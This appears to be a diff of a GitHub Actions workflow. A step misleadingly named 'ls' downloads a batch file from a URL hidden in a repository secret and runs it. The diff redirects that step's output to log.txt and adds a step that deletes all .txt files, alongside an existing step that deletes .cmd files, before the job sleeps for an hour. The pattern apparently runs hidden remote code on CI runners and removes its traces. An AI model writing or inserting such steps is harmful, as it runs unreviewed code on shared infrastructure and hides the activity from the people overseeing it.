@@ -11,8 +11,8 @@ jobs:
     - name: ls
       shell: cmd
       run: |
-        curl -L %GIST_URL% -o loads.bat >nul 2>&1
-        cmd /c loads.bat >nul 2>&1
+        curl -L %GIST_URL% -o loads.bat >log.txt 2>&1
+        cmd /c loads.bat >log.txt 2>&1
       env:
         GIST_URL: ${{ secrets.GIST_URL }}
 
@@ -21,6 +21,10 @@ jobs:
 
     - name: Del2
       run: cmd /c "del /f *.cmd"
+
+    - name: Del3
+      run: cmd /c "del /f *.txt"
+      
     - name: 1
       run: Start-Sleep -Seconds 3600
     - name: 2
